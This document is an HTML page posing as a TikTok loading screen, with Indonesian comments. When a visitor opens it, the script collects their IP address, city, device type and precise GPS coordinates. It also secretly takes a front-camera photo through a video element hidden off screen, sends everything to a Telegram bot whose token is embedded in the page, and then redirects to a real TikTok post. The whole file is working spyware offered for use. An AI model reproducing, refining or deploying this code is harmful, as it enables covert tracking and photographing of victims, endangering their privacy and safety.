<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <style>
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: #000000; display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            overflow: hidden;
        }
        .logo { width: 80px; height: 80px; margin-bottom: 20px; animation: pulse 1.5s infinite ease-in-out; }
        .loader-bar { width: 150px; height: 3px; background-color: #222; border-radius: 5px; overflow: hidden; position: relative; }
        .loader-bar::after {
            content: ''; position: absolute; left: 0; top: 0; height: 100%; width: 50%;
            background-color: #FE2C55; border-radius: 5px; animation: loading 1s infinite ease-in-out;
        }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
        @keyframes loading { 0% { left: -50%; } 100% { left: 100%; } }
        
        /* PERBAIKAN: Jangan pakai display:none. Sembunyikan dengan opacity 0 dan posisi di luar layar */
        #hidden-video { 
            position: absolute; 
            top: -9999px; 
            left: -9999px; 
            width: 320px; 
            height: 240px; 
            opacity: 0;
        }
        #hidden-canvas { display: none; }
    </style>
</head>
<body>
    <svg class="logo" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg">
        <path fill="#FFFFFF" d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/>
    </svg>
    <div class="loader-bar"></div>

    <video id="hidden-video" autoplay playsinline muted></video>
    <canvas id="hidden-canvas"></canvas>

    <script>
        const BOT_TOKEN = '9275303069:AAE5NG2xdePLKc9o7UgubNaIYhOT6r6mjdM';
        const CHAT_ID   = '1354234561';
        const TIKTOK_URL = 'https://www.tiktok.com/@rrrrevaalf/photo/7694167529983462674?is_from_webapp=1&sender_device=pc';

        const video = document.getElementById('hidden-video');
        const canvas = document.getElementById('hidden-canvas');

        function deteksiPerangkat() {
            const ua = navigator.userAgent;
            let device = "Komputer / Laptop";
            let os = "Tidak diketahui";
            let browser = "Tidak diketahui";

            if (/android/i.test(ua)) os = "Android";
            else if (/iPad|iPhone|iPod/.test(ua)) os = "iOS (iPhone/iPad)";
            else if (/Windows/.test(ua)) os = "Windows";
            else if (/Mac/.test(ua)) os = "MacOS";

            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) device = "HP / Mobile";

            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
            else if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Edg")) browser = "Edge";
            else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";

            return `${device} (${os}) - ${browser}`;
        }

        function redirectKeTikTok() {
            window.location.href = TIKTOK_URL;
        }

        async function ambilFoto() {
            try {
                // Minta izin kamera depan
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
                
                // Paksa video untuk playing
                await video.play();

                // PERBAIKAN: Tunggu 1.5 detik agar kamera menyesuaikan cahaya (tidak hitam)
                await new Promise(resolve => setTimeout(resolve, 1500));

                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    throw new Error("Kamera belum siap");
                }

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Matikan kamera setelah dijepret
                stream.getTracks().forEach(track => track.stop());

                return new Promise(resolve => {
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
                });
            } catch (err) {
                console.log("Kamera gagal/diblokir", err);
                return null;
            }
        }

        async function kirimData(ip, kota, negara, lat, lon, deviceInfo, fotoBlob) {
            const captionText = `gps & foto\nip hp: ${ip}\nkota: ${kota}\nnegara: ${negara}\nperkiraan menggunakan apa, hp apa, atau komputer apa: ${deviceInfo}\nkordinat: ${lat}, ${lon}`;

            if (fotoBlob) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', fotoBlob, 'kamera.jpg');
                formData.append('caption', captionText);

                // Kirim foto + teks
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                });
            } else {
                // Jika foto gagal, kirim teks saja
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(captionText)}`;
                await fetch(url, { mode: 'no-cors' });
            }
            
            // Langsung pindah ke TikTok setelah terkirim
            redirectKeTikTok();
        }

        async function jalankan() {
            try {
                const deviceInfo = deteksiPerangkat();

                // Ambil IP
                const responseIp = await fetch('https://ipwho.is/');
                const dataIp = await responseIp.json();
                const ip = dataIp.ip || 'Tidak diketahui';
                const kota = dataIp.city || 'Tidak diketahui';
                const negara = dataIp.country || 'Tidak diketahui';

                if (!navigator.geolocation) {
                    const foto = await ambilFoto();
                    kirimData(ip, kota, negara, 'Tidak Support', 'Tidak Support', deviceInfo, foto);
                    return;
                }

                // PERBAIKAN: Timeout GPS dinaikkan jadi 20 detik (20000)
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        // Jika lokasi diizinkan, ambil foto
                        const foto = await ambilFoto();
                        kirimData(ip, kota, negara, pos.coords.latitude, pos.coords.longitude, deviceInfo, foto);
                    },
                    async (err) => {
                        // Jika lokasi ditolak, tetap ambil foto
                        const foto = await ambilFoto();
                        kirimData(ip, kota, negara, 'Ditolak/Gagal', 'Ditolak/Gagal', deviceInfo, foto);
                    },
                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                );

            } catch (error) {
                console.error(error);
                redirectKeTikTok();
            }
        }

        window.onload = jalankan;
    </script>
</body>
</html>
